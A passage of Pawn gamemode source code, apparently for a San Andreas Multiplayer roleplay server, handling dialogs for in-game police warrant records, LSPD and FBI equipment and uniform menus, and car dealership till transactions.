			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (2) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"3",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd8], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact8], string1, 0, strlen(string1), 255);
			News[hTaken8] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (3) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"4",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd9], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact9], string1, 0, strlen(string1), 255);
			News[hTaken9] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (4) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"5",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd10], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact10], string1, 0, strlen(string1), 255);
			News[hTaken10] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (5) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"6",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd11], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact11], string1, 0, strlen(string1), 255);
			News[hTaken11] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (6) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"7",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd12], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact12], string1, 0, strlen(string1), 255);
			News[hTaken12] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (7) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"8",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd13], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact13], string1, 0, strlen(string1), 255);
			News[hTaken13] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (8) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"all",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd6], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact6], string1, 0, strlen(string1), 255);
			News[hTaken6] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd7], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact7], string1, 0, strlen(string1), 255);
			News[hTaken7] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd8], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact8], string1, 0, strlen(string1), 255);
			News[hTaken8] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd9], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact9], string1, 0, strlen(string1), 255);
			News[hTaken9] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd10], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact10], string1, 0, strlen(string1), 255);
			News[hTaken10] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd11], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact11], string1, 0, strlen(string1), 255);
			News[hTaken11] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd12], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact12], string1, 0, strlen(string1), 255);
			News[hTaken12] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd13], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact13], string1, 0, strlen(string1), 255);
			News[hTaken13] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted all the details for Arrest Warrants from the MDC -Warrants.");
			return 1;
		}
	}
	if(dialogid == MDC_LOGOUT && response)
	{
	}
	if(dialogid == MDC_CREATE && response)
	{
	}
	if((dialogid >= MDC_START_ID && dialogid <= MDC_END_ID) && !response)
	{
	    if(dialogid == MDC_MAIN)
	    {
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now logged off the MDC.");
			ConnectedToPC[playerid] = 0;
	    }
	    else
		{
			ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Find LEO\n*Civilian Information\n*Law Enforcement Agencies\n*MDC Message\n*SMS", "OK", "Cancel");
		}
	}
	if(dialogid == SAN_DUTYMENU)
	{
 		if(response){
			if(PlayerInfo[playerid][pConnectTime] < 2)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

		    switch(listitem) {
				case 0: SetPlayerHealth(playerid, 100);
				case 1: SetPlayerArmourEx(playerid, 50.0);
				case 2: {
					if(GetPlayerCash(playerid) < 150)
						return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");

					GivePlayerCash(playerid, -150);
					GivePlayerValidWeapon(playerid, 25, 60000);
				}
				case 3: GivePlayerValidWeapon(playerid, 43, 60000);
			}
		}
	}
	if(dialogid == DUTYMENU)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Duty
			{
				if(PlayerInfo[playerid][pDuty]==0)
				{
					format(string, sizeof(string), "* Officer %s takes a badge and a gun from their locker.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_BLUE_COLOR);
					SetPlayerSkin(playerid, 280);
					PlayerInfo[playerid][pSkin] = 280;
	    			SetPlayerArmourEx(playerid, 100.0);
	    			SetPlayerHealth(playerid, 100.0);
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
                    //ShowPlayerDialogEx(playerid, DUTY_OPTIONS, DIALOG_STYLE_LIST, "Duty Options","Public\nUndercover", "Select", "Cancel");
				}
				else if(PlayerInfo[playerid][pDuty]==1)
				{
					format(string, sizeof(string), "* Officer %s places their badge and gun in their locker.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_HIT_COLOR);
					SetPlayerArmourEx(playerid, 0.0);
					SetPlayerSkin(playerid, 46);
					PlayerInfo[playerid][pSkin] = 46;
					OnDuty[playerid] = 0;
					PlayerInfo[playerid][pDuty] = 0;
					PlayCrimeReportForPlayer(playerid, playerid, 21);
				}
			}
			if(listitem == 1) // LSPD Weapons
			{
				ShowPlayerDialogEx(playerid, DUTYMENU2, DIALOG_STYLE_LIST, "LSPD Equipment","Mace\nNite Stick\nDesert Eagle\nSPAS-12	$700\nMP5\nM4\nAK-47\nSmoke Grenade\nShotgun\nRifle		$100\nSniper Rifle	$800\nKevlar Vest\nFirst Aid Kit\nAccessories", "Purchase", "Cancel");
			}
			if(listitem == 2) // LSPD Tactical
			{
				if(PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pRank] > 3) // S.W.A.T. division
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					GivePlayerValidWeapon(playerid, 31, 99999);
					GivePlayerValidWeapon(playerid, 17, 5);
					SetPlayerArmourEx(playerid, 100.0);
					SetPlayerHealth(playerid, 100);
					SetPlayerSkin(playerid, 285);
					PlayerInfo[playerid][pSkin] = 285;
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
					format(string, sizeof(string), "* Officer %s quickly grabs their tactical suit and equiptment.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_BLUE_COLOR);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You're not a member of S.W.A.T. or above rank 5.");
				}
			}
			if(listitem == 3) // LSPD Uniforms
			{
				ShowPlayerDialogEx(playerid, DUTYMENU3, DIALOG_STYLE_LIST, "LSPD Uniforms","Cadet\nFemale Officer\nOfficer 1\nOfficer 2\nOfficer 3\nBlack Officer\nLatino Officer\nMotorcycle Officer\nSWAT Officer\nSergeant\nCaptain\nChief", "Put On", "Cancel");
			}
			if(listitem == 4) // LSPD Undercover Uniform
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Undercover","Choose a skin (by ID).", "Select", "Cancel");
			}
			if(listitem == 5) // LSPD Clear.
			{
				ShowPlayerDialogEx(playerid, DUTYMENU5,DIALOG_STYLE_INPUT,"LSPD"," Who would you like to clear?","Clear","Nevermind");
    		}
		}
	}
	if(dialogid == DUTYMENU2)
	{
 		if(response)
		{
 			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");
		    switch(listitem)
			{
				case 0: // LSPD Mace
				{
					GivePlayerValidWeapon(playerid, 41, 60000);
				}
				case 1: // LSPD Nite Stick
				{
					GivePlayerValidWeapon(playerid, 3, 60000);
				}
				case 2: // LSPD Deagle
				{
					GivePlayerValidWeapon(playerid, 24, 60000);
				}
				case 3: // LSPD Spas12 *
				{
					if(PlayerInfo[playerid][pRank] >= 2) {
					    if(GetPlayerCash(playerid) < 700)
							return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");

						GivePlayerCash(playerid, -700);
						GivePlayerValidWeapon(playerid, 27, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're not at least rank 2.");
					}
				}
				case 4: // LSPD mp5
				{
					GivePlayerValidWeapon(playerid, 29, 60000);
				}
				case 5: // LSPD m4 *
				{
    				if(PlayerInfo[playerid][pRank] >= 1)
			    	{
						GivePlayerValidWeapon(playerid, 31, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're not at least rank 1.");
					}
				}
				case 6: // LSPD ak-47 *
				{
    				if(PlayerInfo[playerid][pRank] >= 1)
			    	{
						GivePlayerValidWeapon(playerid, 30, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're not at least rank 1.");
					}
				}
				case 7: // LSPD Smoke Bomb *
				{
					if(PlayerInfo[playerid][pRank] >= 1)
					{
						GivePlayerValidWeapon(playerid, 17, 5);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're not at least rank 1.");
					}
				}
				case 8: // LSPD Shotgun
				{
					GivePlayerValidWeapon(playerid, 25, 60000);
				}
				case 9: // LSPD rifle
				{
					if(GetPlayerCash(playerid) < 100) return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
					GivePlayerCash(playerid, -100);
					GivePlayerValidWeapon(playerid, 33, 60000);
				}
				case 10: // LSPD Sniper *
				{
					if(PlayerInfo[playerid][pRank] >= 2)
					{
 						if(GetPlayerCash(playerid) < 800) return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
						GivePlayerCash(playerid, -800);
						GivePlayerValidWeapon(playerid, 34, 60000);
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD2, "You're not at least rank 3.");
					}
				}
				case 11: // LSPD Kevlar
				{
					SetPlayerArmourEx(playerid, 100.0);
				}
				case 12: SetPlayerHealth(playerid, 100);
				case 13: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Accessories", "Welcome to the law enforcement accessory locker!","Continue", "Cancel");
			}
		}
	}
	if(dialogid == DUTYMENU3)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 71);
				PlayerInfo[playerid][pSkin] = 71;
			}
			if(listitem == 1) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
			if(listitem == 2) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 280);
				PlayerInfo[playerid][pSkin] = 280;
			}
			if(listitem == 3) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 266);
				PlayerInfo[playerid][pSkin] = 266;
			}
			if(listitem == 4) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 281);
				PlayerInfo[playerid][pSkin] = 281;
			}
			if(listitem == 5) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 265);
				PlayerInfo[playerid][pSkin] = 265;
			}

			if(listitem == 6) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 267);
				PlayerInfo[playerid][pSkin] = 267;
			}
			if(listitem == 7) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 284);
				PlayerInfo[playerid][pSkin] = 284;
			}
			if(listitem == 8) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 285);
				PlayerInfo[playerid][pSkin] = 285;
			}
			if(listitem == 9) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 282);
				PlayerInfo[playerid][pSkin] = 282;
			}
			if(listitem == 10) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 283);
				PlayerInfo[playerid][pSkin] = 283;
			}
			if(listitem == 11) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 288);
				PlayerInfo[playerid][pSkin] = 288;
			}
		}
	}
	if(dialogid == DUTYMENU4)
	{
 		if(response)
		{
			if(listitem == 0) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 223);
				PlayerInfo[playerid][pSkin] = 223;
			}
			if(listitem == 1) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 120);
				PlayerInfo[playerid][pSkin] = 120;
			}
			if(listitem == 2) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 240);
				PlayerInfo[playerid][pSkin] = 240;
			}
			if(listitem == 3) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 296);
				PlayerInfo[playerid][pSkin] = 296;
			}
			if(listitem == 4) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 137);
				PlayerInfo[playerid][pSkin] = 137;
			}
			if(listitem == 5) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 214);
				PlayerInfo[playerid][pSkin] = 214;
			}
			if(listitem == 6) // LSPD Uniforms
			{
				SetPlayerSkin(playerid, 147);
				PlayerInfo[playerid][pSkin] = 147;
			}
			if(listitem == 7) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 150);
				PlayerInfo[playerid][pSkin] = 150;
			}
			if(listitem == 8) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 201);
				PlayerInfo[playerid][pSkin] = 201;
			}
			if(listitem == 9) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 162);
				PlayerInfo[playerid][pSkin] = 162;
			}
			if(listitem == 10) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 29);
				PlayerInfo[playerid][pSkin] = 29;
			}
			if(listitem == 11) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 270);
				PlayerInfo[playerid][pSkin] = 270;
			}
			if(listitem == 12) //LSPD Uniforms
			{
				SetPlayerSkin(playerid, 59);
				PlayerInfo[playerid][pSkin] = 59;
			}
		}
	}
    if(dialogid == DUTYMENU5)
	{
	    if(response)
    	{
            new giveplayerid = ReturnUser(inputtext);
			//giveplayerid = strval(inputtext);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					format(string, sizeof(string), "* You cleared the records and wanted points of %s.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has cleared your records and wanted points.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Officer %s has cleared %s's records and wanted points.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendRadioMessage(1, RADIO, string);
					SendRadioMessage(2, RADIO, string);
					PlayerInfo[giveplayerid][pWantedLevel] = 0;
					SetPlayerToTeamColor(giveplayerid);
				    SetPlayerWantedLevel(giveplayerid, 0);
        			ClearCrime(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				}
			}
		}
	}
	if(dialogid == FDUTYMENU)
	{
 		if(response)
		{
			if(listitem == 0) // FBI Duty
			{
				if(PlayerInfo[playerid][pDuty]==0)
				{
					format(string, sizeof(string), "* Agent %s takes a badge and a gun from their locker.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_FBI_COLOR);
					SetPlayerArmourEx(playerid, 100.0);
					SetPlayerHealth(playerid, 100.0);
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerValidWeapon(playerid, 41, 99999);
					GivePlayerValidWeapon(playerid, 3, 99999);
					GivePlayerValidWeapon(playerid, 29, 99999);
					OnDuty[playerid] = 1;
					PlayerInfo[playerid][pDuty] = 1;
				}
				else if(PlayerInfo[playerid][pDuty]==1)
				{
					format(string, sizeof(string), "* Agent %s places their badge and gun in their locker.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid, TEAM_HIT_COLOR);
					SetPlayerSkin(playerid, 46);
					PlayerInfo[playerid][pSkin] = 46;
					SetPlayerArmourEx(playerid, 0.0);
					OnDuty[playerid] = 0;
					PlayerInfo[playerid][pDuty] = 0;
				}
			}
			if(listitem == 1) // FBI Weapons
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU2, DIALOG_STYLE_LIST, "FBI Weapons","Desert Eagle\nShotgun\nSPAS-12	$700\nMP5\nM4\nAK-47\nSmoke Grenade\nCamera\nSniper Rifle	$800\nTactical Vest\nFirst Aid Kit\nRC-Cam	$200\nAccessories", "Purchase", "Cancel");
			}
			if(listitem == 2) // FBI SWAT Uniform
			{
                if(PlayerInfo[playerid][pRank] > 3)
				{
    				SetPlayerSkin(playerid, 285);
	    			PlayerInfo[playerid][pSkin] = 285;
				}
				else
				{
    				SendClientMessage(playerid, COLOR_GRAD2, "You're not the required rank!");
    				return 1;
				}
			}
			if(listitem == 3) // FBI Uniforms
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU3, DIALOG_STYLE_LIST, "FBI Uniforms","Agent with Coat\nBlack Agent\nWhite Agent\nAsian Agent\nAsian Agent 2\nSWAT\nGirl", "Put On", "Cancel");
			}
			if(listitem == 4) // FBI Undercover Uniform
			{
				ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Undercover","Choose a skin (by ID).", "Select", "Cancel");
			}
			if(listitem == 5) // FBI Clear.
			{
				ShowPlayerDialogEx(playerid,FDUTYMENU5,DIALOG_STYLE_INPUT,"FBI"," Who would you like to clear?","Clear","Return");
    		}
		}
	}
	if(dialogid == FDUTYMENU2)
	{
 		if(response)
		{
 			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");
				else switch(listitem) {
				case 0: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
				}
				case 1: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 25, 99999);
				}
				case 2: // FBI Weapons
				{
					if(GetPlayerCash(playerid) < 700) return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
					GivePlayerCash(playerid, -700);
					GivePlayerValidWeapon(playerid, 27, 99999);
				}
				case 3: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 29, 99999);
				}
				case 4: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 31, 99999);
				}
				case 5: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 30, 99999);
				}
				case 6: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 17, 5);
				}
				case 7: // FBI Weapons
				{
					GivePlayerValidWeapon(playerid, 43, 99999);
				}
				case 8: // FBI Weapons
				{
					if(GetPlayerCash(playerid) < 800) return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
					GivePlayerCash(playerid, -800);
					GivePlayerValidWeapon(playerid, 34, 99999);
				}
				case 9: // FBI Weapons
				{
					SetPlayerArmourEx(playerid, 100);
				}
				case 10: SetPlayerHealth(playerid, 100);
				case 11: // FBI Weapons
				{
					if(PlayerInfo[playerid][pRank] >= 2) {
						if(PlayerInfo[playerid][pRccam] == 0) {
							if(GetPlayerCash(playerid) < 200) return SendClientMessage(playerid, COLOR_WHITE, "You don't have the cash for that.");
							GivePlayerCash(playerid, -200);
							PlayerInfo[playerid][pRccam]++;
							SendClientMessage(playerid, COLOR_LIGHTBLUE, "You've recieved one RC-Cam for $200! Use /rccam to activate it.");
						} else return SendClientMessage(playerid, COLOR_GRAD2, "You already have a RC-Cam!");
					} else return SendClientMessage(playerid, COLOR_GRAD2, "You're not the required rank!");
				}
				case 12: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Accessories", "Welcome to the law enforcement accessory locker!","Continue", "Cancel");
			}
		}
	}
	if(dialogid == FDUTYMENU3)
	{
 		if(response)
		{
			if(listitem == 0) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 286);
				PlayerInfo[playerid][pSkin] = 286;
			}
			if(listitem == 1) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 166);
				PlayerInfo[playerid][pSkin] = 166;
			}
			if(listitem == 2) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 165);
				PlayerInfo[playerid][pSkin] = 165;
			}
			if(listitem == 3) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 294);
				PlayerInfo[playerid][pSkin] = 294;
			}
			if(listitem == 4) // FBI Uniforms
			{
				SetPlayerSkin(playerid, 120);
				PlayerInfo[playerid][pSkin] = 120;
			}
			if(listitem == 5) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 285);
				PlayerInfo[playerid][pSkin] = 285;
			}
			if(listitem == 6) //FBI Uniforms
			{
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
		}
	}
	if(dialogid == FDUTYMENU4)
	{
 		if(response)
		{
            new skin = strval(inputtext);
			if(IsInvalidSkin(skin) || 274 <= skin <= 288 || skin == 165 || skin == 166 || skin == 71) {
				return ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Undercover","Invalid skin specified. Choose another.", "Select", "Cancel");
			}
			PlayerInfo[playerid][pSkin] = skin;
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		}
	}
    if(dialogid == FDUTYMENU5)
	{
	    if(response)
    	{
            new giveplayerid;
            new giveplayer[MAX_PLAYER_NAME];
			giveplayerid = ReturnUser(inputtext);
			//giveplayerid = strval(inputtext);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "* You cleared the records and wanted points of %s.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Agent %s has cleared your records and wanted points.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Agent %s has cleared %s's records and wanted points.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendRadioMessage(1, RADIO, string);
					SendRadioMessage(2, RADIO, string);
					PlayerInfo[giveplayerid][pWantedLevel] = 0;
					SetPlayerToTeamColor(giveplayerid);
				    SetPlayerWantedLevel(giveplayerid, 0);
				    ClearCrime(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
				}
			}
		}
	}
	else if(dialogid == DIALOG_CDEDIT)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // New Vehicle
			{
				format(string, sizeof(string),"Please type the model ID of the new vehicle.");
		        ShowPlayerDialogEx(playerid,DIALOG_CDNEWVEH,DIALOG_STYLE_INPUT,"Warning:",string,"Ok","Cancel");
			}
			else if(listitem == 1) // My Vehicles
			{
				new vehicles;
                for(new i=0; i<MAX_DEALERSHIPVEHICLES; i++)
	            {
					if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleModel][i] != 0)
					{
						vehicles++;
		                format(string, sizeof(string), "Vehicle %d| Name: %s | Price: %d.",i+1,GetVehicleName(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][i]),CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleCost][i]);
		                SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
				if(vehicles)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_CDEDITCARS, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose a vehicle to edit:", "Edit", "Back");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, " This car dealership doesn't have any cars.");
				}
			}
			else if(listitem == 2) // Upgrade
			{
				new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			    ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue.", listitems,"Select","Cancel");
			}
			else if(listitem == 3) // Till
			{
				new listitems[] = "1 Withdraw\n2 Deposit";
			    ShowPlayerDialogEx(playerid,DIALOG_CDTILL,DIALOG_STYLE_LIST,"Choose an item to continue.", listitems,"Select","Cancel");
			}
		}
		else
		{
			SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDTILL)
	{ // car dealership dialog
	    if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // Withdraw
			{
				format(string, sizeof(string), "You have $%d in your till account.\n\n\tHow much money to withdraw?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				ShowPlayerDialogEx(playerid,DIALOG_CDWITHDRAW,DIALOG_STYLE_INPUT,"Withdraw", string,"Select","Cancel");
			}
			else if(listitem == 1) // Deposit
			{
				format(string, sizeof(string), "You have $%d in your till account.\n\n\tHow much money to deposit?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				ShowPlayerDialogEx(playerid,DIALOG_CDDEPOSIT,DIALOG_STYLE_INPUT,"Deposit", string,"Select","Cancel");
			}
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDWITHDRAW)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
		    if(IsNumeric(inputtext))
	        {
				new money = strval(inputtext);
				if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] < money)
				{
					format(string, sizeof(string), "You don't have that much in your till!\n\nYou have $%d in your till account.\n\n\tHow much money to withdraw?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
					ShowPlayerDialogEx(playerid,DIALOG_CDWITHDRAW,DIALOG_STYLE_INPUT,"Withdraw", string,"Select","Cancel");
					return 1;
				}
				CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] -= money;
				PlayerInfo[playerid][pCash] += money;
				format(string, sizeof(string), "You have successfully withdrawn $%d from your till, new balance: $%d", money, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				SendClientMessage(playerid, COLOR_GRAD2, string);
				SavecDealerships();
				SetPVarInt(playerid, "editingcd", -1);
			}
        }
		else
		{
             SavecDealerships();
             SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDDEPOSIT)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
		    if(IsNumeric(inputtext))
	        {
	             new money = strval(inputtext);
	             if(PlayerInfo[playerid][pCash] < money)
	             {
                     format(string, sizeof(string), "You don't have that much in your wallet!\n\nYou have $%d in your till account.\n\n\tHow much money to deposit?", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
				     ShowPlayerDialogEx(playerid,DIALOG_CDDEPOSIT,DIALOG_STYLE_INPUT,"Deposit", string,"Select","Cancel");
                     return 1;
	             }
	             CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill] += money;
	             PlayerInfo[playerid][pCash] -= money;
	             format(string, sizeof(string), "You have successfully deposited $%d to your till, new balance: $%d", money, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdTill]);
	             SendClientMessage(playerid, COLOR_GRAD2, string);
	             SavecDealerships();
